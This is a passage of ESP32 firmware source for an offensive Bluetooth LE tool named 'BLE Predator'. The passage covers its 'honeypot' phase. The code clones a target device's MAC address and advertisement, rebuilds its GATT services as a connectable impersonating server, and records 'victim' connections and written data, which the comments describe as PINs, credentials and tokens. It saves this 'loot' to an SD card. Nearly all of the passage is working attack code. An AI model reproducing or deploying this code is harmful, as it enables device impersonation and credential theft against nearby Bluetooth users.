    BLEDevice::deinit(false);
    delay(100);

    // Auto-transition to HONEYPOT
    startHoneypot();
}

static void handleReconTouch() {
    uint16_t tx, ty;
    bool touching = getTouchPoint(&tx, &ty);

    if (bpWaitForRelease) {
        if (!touching) bpWaitForRelease = false;
        return;
    }
    if (!touching) return;
    if (millis() - S->lastIconTap < 350) return;
    S->lastIconTap = millis();
    bpWaitForRelease = true;

    // Icon bar back → abort RECON
    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
        // RECON is synchronous so this handler only runs between phases.
        // If we get here, RECON must have completed — just go back.
        goBackToListen();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 5: HONEYPOT — GATT Server Clone + Loot Logging
// Build GATTS server from RECON data, broadcast connectable ADV, log loot
// ═══════════════════════════════════════════════════════════════════════════

// Forward reference — S is already declared but hpGattsHandler needs it
static void hpGattsHandler(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
                           esp_ble_gatts_cb_param_t* param);
static void hpStartAdvertising();
static void hpBuildNextService();
static void hpBuildNextChar();

static void hpAddLoot(uint8_t type, const uint8_t* mac, uint16_t charHandle,
                      const uint8_t* data, uint8_t dataLen) {
    if (!S) return;
    uint8_t idx = S->hpLootCount % HP_MAX_LOOT;
    HpLootEntry* e = &S->hpLoot[idx];
    e->timestamp = millis();
    e->type = type;
    e->charHandle = charHandle;
    e->dataLen = (dataLen > 20) ? 20 : dataLen;
    if (mac) memcpy(e->victimMAC, mac, 6);
    if (data && e->dataLen > 0) memcpy(e->data, data, e->dataLen);
    S->hpLootCount++;
}

// Find which HpCharInfo corresponds to an assigned GATTS handle
static HpCharInfo* hpFindCharByHandle(uint16_t handle) {
    for (int i = 0; i < S->hpCharCount; i++) {
        if (S->hpChars[i].handle == handle) return &S->hpChars[i];
    }
    return nullptr;
}

// GATTS event handler — the core of the honeypot
static void hpGattsHandler(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
                           esp_ble_gatts_cb_param_t* param) {
    if (!S || !S->hpActive) return;

    switch (event) {
        case ESP_GATTS_REG_EVT: {
            S->hpGattsIf = gatts_if;
            S->hpBuildStep = 0;
            S->hpBuildCharIdx = 0;
            // Start building first service
            hpBuildNextService();
            break;
        }

        case ESP_GATTS_CREATE_EVT: {
            if (param->create.status != ESP_GATT_OK) {
                #if CYD_DEBUG
                Serial.printf("[HP] Service create failed: %d\n", param->create.status);
                #endif
                break;
            }
            // Store service handle
            if (S->hpBuildStep < S->hpSvcCount) {
                S->hpSvcs[S->hpBuildStep].handle = param->create.service_handle;

                // Start the service
                esp_ble_gatts_start_service(param->create.service_handle);
            }
            break;
        }

        case ESP_GATTS_START_EVT: {
            if (param->start.status != ESP_GATT_OK) break;

            // Add characteristics for this service
            if (S->hpBuildStep < S->hpSvcCount) {
                HpServiceInfo* si = &S->hpSvcs[S->hpBuildStep];
                if (si->charCount > 0) {
                    S->hpBuildCharIdx = si->charStart;
                    hpBuildNextChar();
                } else {
                    // No chars in this service, move to next service
                    S->hpBuildStep++;
                    if (S->hpBuildStep < S->hpSvcCount) {
                        hpBuildNextService();
                    } else {
                        // All services built — start advertising
                        hpStartAdvertising();
                    }
                }
            }
            break;
        }

        case ESP_GATTS_ADD_CHAR_EVT: {
            if (param->add_char.status != ESP_GATT_OK) {
                #if CYD_DEBUG
                Serial.printf("[HP] Char add failed: %d\n", param->add_char.status);
                #endif
            }
            // Store assigned handle
            for (int i = 0; i < S->hpCharCount; i++) {
                if (S->hpChars[i].handle == 0) {
                    // Find the char we just added by checking build index
                    if (i == S->hpBuildCharIdx) {
                        S->hpChars[i].handle = param->add_char.attr_handle;
                        break;
                    }
                }
            }

            S->hpBuildCharIdx++;

            // Check if more chars to add for current service
            HpServiceInfo* si = &S->hpSvcs[S->hpBuildStep];
            if (S->hpBuildCharIdx < si->charStart + si->charCount) {
                hpBuildNextChar();
            } else {
                // Move to next service
                S->hpBuildStep++;
                if (S->hpBuildStep < S->hpSvcCount) {
                    hpBuildNextService();
                } else {
                    // All services + chars built — start advertising
                    hpStartAdvertising();
                }
            }
            break;
        }

        case ESP_GATTS_CONNECT_EVT: {
            S->hpConnId = param->connect.conn_id;
            memcpy(S->hpVictimMAC, param->connect.remote_bda, 6);
            S->hpConnCount++;

            hpAddLoot(HP_EVT_CONNECT, param->connect.remote_bda, 0, nullptr, 0);

            #if CYD_DEBUG
            Serial.printf("[HP] VICTIM CONNECTED: %02X:%02X:%02X:%02X:%02X:%02X\n",
                          param->connect.remote_bda[0], param->connect.remote_bda[1],
                          param->connect.remote_bda[2], param->connect.remote_bda[3],
                          param->connect.remote_bda[4], param->connect.remote_bda[5]);
            #endif
            break;
        }

        case ESP_GATTS_READ_EVT: {
            // Return cached value and log the read
            HpCharInfo* ci = hpFindCharByHandle(param->read.handle);

            esp_gatt_rsp_t rsp;
            memset(&rsp, 0, sizeof(rsp));
            rsp.attr_value.handle = param->read.handle;

            if (ci && ci->cachedValLen > 0) {
                rsp.attr_value.len = ci->cachedValLen;
                memcpy(rsp.attr_value.value, ci->cachedVal, ci->cachedValLen);
            } else {
                // Return empty response
                rsp.attr_value.len = 0;
            }

            esp_ble_gatts_send_response(gatts_if, param->read.conn_id,
                                        param->read.trans_id, ESP_GATT_OK, &rsp);

            hpAddLoot(HP_EVT_READ, S->hpVictimMAC, param->read.handle, nullptr, 0);

            #if CYD_DEBUG
            Serial.printf("[HP] READ handle=%d\n", param->read.handle);
            #endif
            break;
        }

        case ESP_GATTS_WRITE_EVT: {
            // ★ THE GOLD — log the written data (PINs, creds, tokens)
            if (param->write.need_rsp) {
                esp_ble_gatts_send_response(gatts_if, param->write.conn_id,
                                            param->write.trans_id, ESP_GATT_OK, nullptr);
            }

            hpAddLoot(HP_EVT_WRITE, S->hpVictimMAC, param->write.handle,
                      param->write.value, param->write.len);

            #if CYD_DEBUG
            Serial.printf("[HP] ★ WRITE handle=%d len=%d data=", param->write.handle, param->write.len);
            for (int i = 0; i < param->write.len && i < 20; i++) {
                Serial.printf("%02X", param->write.value[i]);
            }
            Serial.println();
            #endif
            break;
        }

        case ESP_GATTS_DISCONNECT_EVT: {
            hpAddLoot(HP_EVT_DISCONNECT, S->hpVictimMAC, 0, nullptr, 0);

            #if CYD_DEBUG
            Serial.println("[HP] VICTIM DISCONNECTED");
            #endif

            // Restart advertising for next victim
            if (S->hpActive) {
                hpStartAdvertising();
            }
            break;
        }

        default:
            break;
    }
}

static void hpBuildNextService() {
    if (S->hpBuildStep >= S->hpSvcCount) return;
    HpServiceInfo* si = &S->hpSvcs[S->hpBuildStep];

    esp_gatt_srvc_id_t svcId;
    memset(&svcId, 0, sizeof(svcId));
    svcId.is_primary = true;

    if (si->uuid16 != 0) {
        svcId.id.uuid.len = ESP_UUID_LEN_16;
        svcId.id.uuid.uuid.uuid16 = si->uuid16;
    } else {
        svcId.id.uuid.len = ESP_UUID_LEN_128;
        memcpy(svcId.id.uuid.uuid.uuid128, si->uuid128, 16);
    }

    // num_handle: 1 for service + 2 per characteristic (char decl + char value)
    uint16_t numHandle = 1 + (si->charCount * 2);
    esp_ble_gatts_create_service(S->hpGattsIf, &svcId, numHandle);
}

static void hpBuildNextChar() {
    if (S->hpBuildCharIdx >= S->hpCharCount) return;
    HpCharInfo* ci = &S->hpChars[S->hpBuildCharIdx];
    HpServiceInfo* si = &S->hpSvcs[ci->svcIdx];

    esp_bt_uuid_t charUUID;
    memset(&charUUID, 0, sizeof(charUUID));
    if (ci->uuid16 != 0) {
        charUUID.len = ESP_UUID_LEN_16;
        charUUID.uuid.uuid16 = ci->uuid16;
    } else {
        charUUID.len = ESP_UUID_LEN_128;
        memcpy(charUUID.uuid.uuid128, ci->uuid128, 16);
    }

    // Map BLE properties to GATT permissions
    esp_gatt_perm_t perm = 0;
    if (ci->properties & ESP_GATT_CHAR_PROP_BIT_READ)    perm |= ESP_GATT_PERM_READ;
    if (ci->properties & ESP_GATT_CHAR_PROP_BIT_WRITE)   perm |= ESP_GATT_PERM_WRITE;
    if (ci->properties & ESP_GATT_CHAR_PROP_BIT_WRITE_NR) perm |= ESP_GATT_PERM_WRITE;

    // Ensure at least read permission so we can respond
    if (perm == 0) perm = ESP_GATT_PERM_READ;

    esp_attr_value_t charVal;
    memset(&charVal, 0, sizeof(charVal));
    charVal.attr_max_len = HP_MAX_READ_VAL;
    charVal.attr_len = ci->cachedValLen;
    charVal.attr_value = ci->cachedVal;

    esp_attr_control_t control;
    control.auto_rsp = ESP_GATT_RSP_BY_APP;  // We handle READ/WRITE in the callback

    esp_ble_gatts_add_char(si->handle, &charUUID, perm,
                           (esp_gatt_char_prop_t)ci->properties, &charVal, &control);
}

static void hpStartAdvertising() {
    if (!S || !S->hpActive) return;

    int realIdx = bpFilteredToReal(S->detailIdx);
    if (realIdx < 0) return;
    ReconDevice* target = &S->devices[realIdx];

    // Clone target's MAC — same logic as doReplayBroadcast()
    uint8_t replayMac[6];
    memcpy(replayMac, target->mac, 6);
    if (target->addrType == BLE_ADDR_TYPE_PUBLIC) {
        replayMac[0] |= 0xC0;  // Force random-static for public MAC
    }

    esp_err_t err;
    err = esp_ble_gap_set_rand_addr(replayMac);
    #if CYD_DEBUG
    Serial.printf("[HP] set_rand_addr: %s\n", esp_err_to_name(err));
    #endif

    // Send target's raw ADV payload
    err = esp_ble_gap_config_adv_data_raw(target->payload,
                                     target->payloadLen > 0 ? target->payloadLen : 31);
    #if CYD_DEBUG
    Serial.printf("[HP] config_adv_data_raw(%d bytes): %s\n",
                  target->payloadLen > 0 ? target->payloadLen : 31, esp_err_to_name(err));
    #endif

    // Set empty scan response — prevents stale data or auto-generated name leaking
    uint8_t emptyScanRsp[] = { 0x02, 0x01, 0x06 };  // Minimal: Flags only
    esp_ble_gap_config_scan_rsp_data_raw(emptyScanRsp, sizeof(emptyScanRsp));

    // Wait for async ADV data config to complete (longer than 1ms for reliability)
    delay(50);

    // KEY DIFFERENCE: ADV_TYPE_IND = connectable undirected (not NONCONN_IND)
    esp_ble_adv_params_t advP;
    memset(&advP, 0, sizeof(advP));
    advP.adv_int_min = 0x20;
    advP.adv_int_max = 0x40;
    advP.adv_type = ADV_TYPE_IND;                    // ★ CONNECTABLE
    advP.own_addr_type = BLE_ADDR_TYPE_RANDOM;
    advP.channel_map = ADV_CHNL_ALL;
    advP.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

    err = esp_ble_gap_start_advertising(&advP);
    if (err == ESP_OK) {
        S->hpAdvStarted = true;
        #if CYD_DEBUG
        Serial.println("[HP] Connectable advertising started OK");
        #endif
    } else {
        S->hpAdvStarted = false;
        #if CYD_DEBUG
        Serial.printf("[HP] start_advertising FAILED: %s\n", esp_err_to_name(err));
        #endif
        hpSetStatus("ADV start failed!", 0xF800);
    }
}

// Build generic GATT profile when RECON fails (no target connection).
// Creates standard services: Generic Access (0x1800) + Device Info (0x180A)
// with common characteristics that attract service discovery from victims.
static void buildGenericGATT() {
    S->hpSvcCount = 0;
    S->hpCharCount = 0;
    memset(S->hpSvcs, 0, sizeof(S->hpSvcs));
    memset(S->hpChars, 0, sizeof(S->hpChars));

    // ── Service 0: Generic Access (0x1800) ──────────────────────────────
    HpServiceInfo* svc0 = &S->hpSvcs[0];
    svc0->uuid16 = 0x1800;
    svc0->charStart = 0;
    svc0->charCount = 2;

    // Char 0: Device Name (0x2A00) — readable
    HpCharInfo* c0 = &S->hpChars[0];
    c0->uuid16 = 0x2A00;
    c0->properties = ESP_GATT_CHAR_PROP_BIT_READ;
    c0->svcIdx = 0;
    // Use target name if available, else "BLE Device"
    int realIdx = bpFilteredToReal(S->detailIdx);
    const char* devName = "BLE Device";
    if (realIdx >= 0 && S->devices[realIdx].name[0] != '\0') {
        devName = S->devices[realIdx].name;
    }
    c0->cachedValLen = strlen(devName);
    if (c0->cachedValLen > HP_MAX_READ_VAL) c0->cachedValLen = HP_MAX_READ_VAL;
    memcpy(c0->cachedVal, devName, c0->cachedValLen);

    // Char 1: Appearance (0x2A01) — readable, generic
    HpCharInfo* c1 = &S->hpChars[1];
    c1->uuid16 = 0x2A01;
    c1->properties = ESP_GATT_CHAR_PROP_BIT_READ;
    c1->svcIdx = 0;
    c1->cachedVal[0] = 0x00;  // Generic category
    c1->cachedVal[1] = 0x00;
    c1->cachedValLen = 2;

    // ── Service 1: Device Information (0x180A) ──────────────────────────
    HpServiceInfo* svc1 = &S->hpSvcs[1];
    svc1->uuid16 = 0x180A;
    svc1->charStart = 2;
    svc1->charCount = 3;

    // Char 2: Manufacturer Name (0x2A29) — readable
    HpCharInfo* c2 = &S->hpChars[2];
    c2->uuid16 = 0x2A29;
    c2->properties = ESP_GATT_CHAR_PROP_BIT_READ;
    c2->svcIdx = 1;
    const char* mfr = "Unknown";
    c2->cachedValLen = strlen(mfr);
    memcpy(c2->cachedVal, mfr, c2->cachedValLen);

    // Char 3: Model Number (0x2A24) — readable
    HpCharInfo* c3 = &S->hpChars[3];
    c3->uuid16 = 0x2A24;
    c3->properties = ESP_GATT_CHAR_PROP_BIT_READ;
    c3->svcIdx = 1;
    const char* model = "Generic";
    c3->cachedValLen = strlen(model);
    memcpy(c3->cachedVal, model, c3->cachedValLen);

    // Char 4: Firmware Revision (0x2A26) — readable, writable (honeypot bait)
    HpCharInfo* c4 = &S->hpChars[4];
    c4->uuid16 = 0x2A26;
    c4->properties = ESP_GATT_CHAR_PROP_BIT_READ | ESP_GATT_CHAR_PROP_BIT_WRITE;
    c4->svcIdx = 1;
    const char* fwRev = "1.0.0";
    c4->cachedValLen = strlen(fwRev);
    memcpy(c4->cachedVal, fwRev, c4->cachedValLen);

    S->hpSvcCount = 2;
    S->hpCharCount = 5;
    S->hpReconDone = true;

    #if CYD_DEBUG
    Serial.printf("[HP] Generic GATT built: %d SVCs, %d CHARs (RECON skipped)\n",
                  S->hpSvcCount, S->hpCharCount);
    #endif
}

static void startHoneypot() {
    if (!S->hpReconDone) return;

    // Re-init BLE for GATTS server — empty name to avoid leaking identity
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    S->hpActive = true;
    S->hpAdvStarted = false;
    S->hpBuildStep = 0;
    S->hpBuildCharIdx = 0;

    // Register GATTS callback — this triggers the service build chain
    esp_ble_gatts_register_callback(hpGattsHandler);
    esp_ble_gatts_app_register(0);  // app_id = 0

    // Phase transition
    S->phase = PHASE_HONEYPOT;
    S->staticDrawn = false;
    S->hpStatusTime = 0;
    S->hpStatusMsg[0] = '\0';
    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
    drawIconBar();

    // Draw immediately — don't wait for first loop tick
    drawHoneypotStatic();
    drawHoneypotLoot();
    S->lastDisplayUpdate = millis();

    #if CYD_DEBUG
    Serial.printf("[HP] Honeypot started: %d SVCs, %d CHARs\n", S->hpSvcCount, S->hpCharCount);
    #endif
}

static void stopHoneypot() {
    S->hpActive = false;

    if (S->hpAdvStarted) {
        esp_ble_gap_stop_advertising();
        S->hpAdvStarted = false;
    }

    esp_ble_gatts_app_unregister(S->hpGattsIf);
    BLEDevice::deinit(false);
    delay(100);

    // Re-init for scanning
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    S->pScan = BLEDevice::getScan();
    if (S->pScan) {
        S->pScan->setActiveScan(false);
        S->pScan->setInterval(100);
        S->pScan->setWindow(99);
        S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);
        S->scanning = true;
        S->pScan->start(5, bpScanComplete, false);
    }

    S->staticDrawn = false;
    S->phase = PHASE_LISTEN;

    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
    drawIconBar();
    drawHeader();
    drawDeviceList();

    #if CYD_DEBUG
    Serial.printf("[HP] Honeypot stopped. Connections: %d, Loot: %d\n",
                  S->hpConnCount, S->hpLootCount);
    #endif
}

// ── HONEYPOT UI ─────────────────────────────────────────────────────────

static void hpSetStatus(const char* msg, uint16_t color) {
    strncpy(S->hpStatusMsg, msg, 31);
    S->hpStatusMsg[31] = '\0';
    S->hpStatusColor = color;
    S->hpStatusTime = millis();
}

static void drawHoneypotStatic() {
    tft.setTextSize(1);

    // Title area — clear enough space for Nosifer + phase label below
    tft.fillRect(0, SCALE_Y(38), SCREEN_WIDTH, SCALE_H(30), HALEHOUND_BLACK);
    drawGlitchText(SCALE_Y(50), "PREDATOR", &Nosifer_Regular10pt7b);

    tft.setFreeFont(NULL);
    tft.setTextSize(1);

    // Phase label — BELOW the Nosifer title, not on top of it
    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(55), SCALE_Y(58));
    tft.print(">> HONEYPOT <<");

    // Divider line between title and target info
    tft.drawLine(0, SCALE_Y(68), SCREEN_WIDTH, SCALE_Y(68), HALEHOUND_HOTPINK);

    // Target info
    int realIdx = bpFilteredToReal(S->detailIdx);
    if (realIdx >= 0) {
        ReconDevice* target = &S->devices[realIdx];
        char macStr[18];
        bpMacToStr(target->mac, macStr, sizeof(macStr));

        int y = SCALE_Y(72);
        tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
        tft.setCursor(SCALE_X(5), y);
        tft.print("Clone: ");
        tft.setTextColor(HALEHOUND_CYAN, HALEHOUND_BLACK);
        tft.print(macStr);

        y += SCALE_H(13);
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
        tft.setCursor(SCALE_X(5), y);
        tft.printf("SVCs:%d  CHARs:%d", S->hpSvcCount, S->hpCharCount);
    }

    // ── Prominent status banner ────────────────────────────────────────
    int bannerY = SCALE_Y(98);
    tft.fillRect(0, bannerY, SCREEN_WIDTH, SCALE_H(18), HALEHOUND_DARK);
    tft.drawLine(0, bannerY, SCREEN_WIDTH, bannerY, HALEHOUND_VIOLET);
    tft.drawLine(0, bannerY + SCALE_H(17), SCREEN_WIDTH, bannerY + SCALE_H(17), HALEHOUND_VIOLET);

    // Buttons at bottom — bigger, clearer
    int btnW = SCALE_W(65);
    int btnH = SCALE_H(26);
    int btnY = SCREEN_HEIGHT - SCALE_H(32);

    int stopX  = SCALE_X(5);
    int saveX  = SCALE_X(80);
    int clearX = SCALE_X(160);

    // STOP — bright, obvious
    tft.fillRect(stopX, btnY, btnW, btnH, HALEHOUND_DARK);
    tft.drawRect(stopX, btnY, btnW, btnH, HALEHOUND_HOTPINK);
    tft.drawRect(stopX + 1, btnY + 1, btnW - 2, btnH - 2, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(stopX + SCALE_X(14), btnY + SCALE_H(8));
    tft.print("STOP");

    // SAVE
    tft.fillRect(saveX, btnY, btnW, btnH, HALEHOUND_DARK);
    tft.drawRect(saveX, btnY, btnW, btnH, HALEHOUND_MAGENTA);
    tft.drawRect(saveX + 1, btnY + 1, btnW - 2, btnH - 2, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(saveX + SCALE_X(14), btnY + SCALE_H(8));
    tft.print("SAVE");

    // CLEAR
    tft.fillRect(clearX, btnY, btnW, btnH, HALEHOUND_DARK);
    tft.drawRect(clearX, btnY, btnW, btnH, HALEHOUND_VIOLET);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(clearX + SCALE_X(10), btnY + SCALE_H(8));
    tft.print("CLEAR");

    S->staticDrawn = true;
}

static void drawHoneypotLoot() {
    uint32_t now = millis();
    tft.setTextSize(1);

    // ── Status banner (between header and loot) ──────────────────────
    int bannerY = SCALE_Y(98);
    int bannerH = SCALE_H(18);
    tft.fillRect(1, bannerY + 1, SCREEN_WIDTH - 2, bannerH - 2, HALEHOUND_DARK);

    // Left side: connection count + loot count
    tft.setTextColor(HALEHOUND_CYAN, HALEHOUND_DARK);
    tft.setCursor(SCALE_X(5), bannerY + SCALE_H(4));
    tft.printf("Conns:%d  Loot:%d", S->hpConnCount, S->hpLootCount);

    // Right side: LIVE indicator with pulsing dot
    if (S->hpAdvStarted) {
        // Pulsing dot — alternates between hotpink and dark every 500ms
        bool pulse = ((now / 500) % 2) == 0;
        uint16_t dotColor = pulse ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
        tft.fillCircle(SCALE_X(180), bannerY + bannerH / 2, 4, dotColor);
        tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_DARK);
        tft.setCursor(SCALE_X(190), bannerY + SCALE_H(4));
        tft.print("LIVE");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_DARK);
        tft.setCursor(SCALE_X(180), bannerY + SCALE_H(4));
        tft.print("BUILDING...");
    }

    // ── Status message (if set, shows for 3 seconds) ─────────────────
    int statusY = bannerY + bannerH + 1;
    int statusH = SCALE_H(14);
    tft.fillRect(0, statusY, SCREEN_WIDTH, statusH, HALEHOUND_BLACK);
    if (S->hpStatusTime > 0 && (now - S->hpStatusTime) < 3000) {
        tft.setTextColor(S->hpStatusColor, HALEHOUND_BLACK);
        tft.setCursor(SCALE_X(5), statusY + 2);
        tft.print(S->hpStatusMsg);
    }

    // ── Loot display area ────────────────────────────────────────────
    int lootY = statusY + statusH + 1;
    int btnTop = SCREEN_HEIGHT - SCALE_H(34);
    int lootH = btnTop - lootY - 2;
    int lineH = SCALE_H(13);
    int maxLines = lootH / lineH;

    // Clear loot area
    tft.fillRect(0, lootY, SCREEN_WIDTH, lootH, HALEHOUND_BLACK);

    if (S->hpLootCount == 0) {
        // Animated waiting text with cycling dots
        int dots = ((now / 400) % 4);
        tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
        tft.setCursor(SCALE_X(30), lootY + lootH / 3);
        tft.print("Waiting for victims");
        for (int d = 0; d < dots; d++) tft.print(".");
        tft.print("   ");  // Clear trailing dots from previous frame

        // Helpful hint
        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_BLACK);
        tft.setCursor(SCALE_X(15), lootY + lootH / 3 + SCALE_H(16));
        tft.print("Luring nearby BLE devices");
        tft.setCursor(SCALE_X(15), lootY + lootH / 3 + SCALE_H(30));
        tft.print("Captures on connect/write");
        return;
    }

    // Show loot entries (newest at bottom, scrollable)
    int totalEntries = (S->hpLootCount > HP_MAX_LOOT) ? HP_MAX_LOOT : S->hpLootCount;
    int startIdx = 0;
    if (totalEntries > maxLines) {
        startIdx = totalEntries - maxLines - S->hpLootScroll;
        if (startIdx < 0) startIdx = 0;
    }

    int y = lootY;
    for (int i = startIdx; i < totalEntries && (y + lineH) < (lootY + lootH); i++) {
        int ringIdx = i;
        if (S->hpLootCount > HP_MAX_LOOT) {
            ringIdx = (S->hpLootCount - HP_MAX_LOOT + i) % HP_MAX_LOOT;
        }
        HpLootEntry* e = &S->hpLoot[ringIdx];

        tft.setCursor(SCALE_X(3), y + 2);
        tft.setTextSize(1);

        switch (e->type) {
            case HP_EVT_CONNECT:
                tft.setTextColor(HALEHOUND_CYAN);
                tft.printf("[!] CONN %02X:%02X:%02X:%02X:%02X:%02X",
                           e->victimMAC[0], e->victimMAC[1], e->victimMAC[2],
                           e->victimMAC[3], e->victimMAC[4], e->victimMAC[5]);
                break;

            case HP_EVT_DISCONNECT:
                tft.setTextColor(HALEHOUND_CYAN);
                tft.print("[!] DISCONNECTED");
                break;

            case HP_EVT_READ:
                tft.setTextColor(HALEHOUND_GUNMETAL);
                tft.printf("[R] H:0x%04X read", e->charHandle);
                break;

            case HP_EVT_WRITE:
                tft.setTextColor(HALEHOUND_HOTPINK);
                tft.printf("[W] 0x%04X ", e->charHandle);
                // Show data as hex + ASCII
                for (int b = 0; b < e->dataLen && b < 8; b++) {
                    tft.printf("%02X", e->data[b]);
                }
                if (e->dataLen > 0) {
                    tft.print(" \"");
                    for (int b = 0; b < e->dataLen && b < 8; b++) {
                        char c = (char)e->data[b];
                        tft.print((c >= 0x20 && c < 0x7F) ? c : '.');
                    }
                    tft.print("\"");
                }
                break;
        }
        y += lineH;
    }
}

static void hpSaveLootToSD() {
    if (S->hpLootCount == 0) {
        hpSetStatus("No loot to save!", HALEHOUND_GUNMETAL);
        return;
    }

    // Init SD card (same pattern as WhisperPair)
    SPI.end();
    delay(10);
    SPI.begin(18, 19, 23);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    delay(10);

    if (!SD.begin(SD_CS, SPI, 4000000)) {
        SPI.end();
        delay(50);
        SPI.begin(18, 19, 23);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            hpSetStatus("SD card not found!", 0xF800);
            SD.end();
            return;
        }
    }

    if (!SD.exists("/loot")) {
        SD.mkdir("/loot");
    }

    // Build filename
    char fname[48];
    snprintf(fname, sizeof(fname), "/loot/ble_hp_%lu.txt", millis());

    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        hpSetStatus("File write failed!", 0xF800);
        SD.end();
        return;
    }

    // Write header
    f.println("========================================");
    f.println("  BLE PREDATOR — HONEYPOT LOOT");
    f.println("  HaleHound Edition");
    f.println("========================================");
    f.println();

    int realIdx = bpFilteredToReal(S->detailIdx);
    if (realIdx >= 0) {
        ReconDevice* target = &S->devices[realIdx];
        char macStr[18];
        bpMacToStr(target->mac, macStr, sizeof(macStr));
        f.printf("Target: %s (%s)\n", macStr, target->hasName ? target->name : "unknown");
    }
    f.printf("Services: %d, Characteristics: %d\n", S->hpSvcCount, S->hpCharCount);
    f.printf("Connections: %d, Loot entries: %d\n", S->hpConnCount, S->hpLootCount);
    f.println();

    // Write service table
    f.println("--- GATT TABLE ---");
    for (int s = 0; s < S->hpSvcCount; s++) {
        HpServiceInfo* si = &S->hpSvcs[s];
        if (si->uuid16 != 0) {
            const char* sn = lookupServiceName(si->uuid16);
            f.printf("Service 0x%04X (%s)\n", si->uuid16, sn ? sn : "Custom");
        } else {
            f.printf("Service %02X%02X%02X%02X...\n",
                     si->uuid128[12], si->uuid128[13], si->uuid128[14], si->uuid128[15]);
        }
        for (int c = si->charStart; c < si->charStart + si->charCount; c++) {
            HpCharInfo* ci = &S->hpChars[c];
            char props[8];
            int pi = 0;
            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_READ)    props[pi++] = 'R';
            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_WRITE)   props[pi++] = 'W';
            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_WRITE_NR) props[pi++] = 'w';
            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_NOTIFY)  props[pi++] = 'N';
            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_INDICATE) props[pi++] = 'I';
            props[pi] = '\0';
            if (ci->uuid16 != 0) {
                f.printf("  Char 0x%04X [%s]\n", ci->uuid16, props);
            } else {
                f.printf("  Char %02X%02X..%02X%02X [%s]\n",
                         ci->uuid128[12], ci->uuid128[13], ci->uuid128[14], ci->uuid128[15], props);
            }
        }
    }
    f.println();

    // Write events
    f.println("--- EVENTS ---");
    int totalEntries = (S->hpLootCount > HP_MAX_LOOT) ? HP_MAX_LOOT : S->hpLootCount;
    for (int i = 0; i < totalEntries; i++) {
        int ringIdx = i;
        if (S->hpLootCount > HP_MAX_LOOT) {
            ringIdx = (S->hpLootCount - HP_MAX_LOOT + i) % HP_MAX_LOOT;
        }
        HpLootEntry* e = &S->hpLoot[ringIdx];

        switch (e->type) {
            case HP_EVT_CONNECT:
                f.printf("[%08lu] CONNECT victim=%02X:%02X:%02X:%02X:%02X:%02X\n",
                         e->timestamp,
                         e->victimMAC[0], e->victimMAC[1], e->victimMAC[2],
                         e->victimMAC[3], e->victimMAC[4], e->victimMAC[5]);
                break;
            case HP_EVT_DISCONNECT:
                f.printf("[%08lu] DISCONNECT\n", e->timestamp);
                break;
            case HP_EVT_READ:
                f.printf("[%08lu] READ   char=0x%04X\n", e->timestamp, e->charHandle);
                break;
            case HP_EVT_WRITE: {
                f.printf("[%08lu] WRITE  char=0x%04X len=%d data=",
                         e->timestamp, e->charHandle, e->dataLen);
                for (int b = 0; b < e->dataLen; b++) {
                    f.printf("%02X", e->data[b]);
                }
                // ASCII representation
                f.print(" ascii=\"");
                for (int b = 0; b < e->dataLen; b++) {
                    char c = (char)e->data[b];
                    f.print((c >= 0x20 && c < 0x7F) ? c : '.');
                }
                f.println("\"");
                break;
            }
        }
    }
    f.println();
    f.println("========================================");

    f.close();
    SD.end();

    // Confirmation via status banner (persists 3 seconds)
    char statusBuf[32];
    snprintf(statusBuf, sizeof(statusBuf), "SAVED: %s", fname + 6);  // Skip "/loot/"
    hpSetStatus(statusBuf, 0x07E0);  // Green
}

static void handleHoneypotTouch() {
    uint16_t tx, ty;
    bool touching = getTouchPoint(&tx, &ty);

    if (bpWaitForRelease) {
        if (!touching) bpWaitForRelease = false;
        return;
    }
    if (!touching) return;
    if (millis() - S->lastIconTap < 350) return;
    S->lastIconTap = millis();
    bpWaitForRelease = true;

    // Icon bar back → stop honeypot
    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
        stopHoneypot();
        return;
    }

    // Bottom buttons: STOP / SAVE / CLEAR — 3-zone split for robust touch
    int btnY = SCREEN_HEIGHT - SCALE_H(36);
    int btnH = SCALE_H(36);
    int zoneW = SCREEN_WIDTH / 3;

    if (ty >= btnY - 5 && ty <= btnY + btnH) {
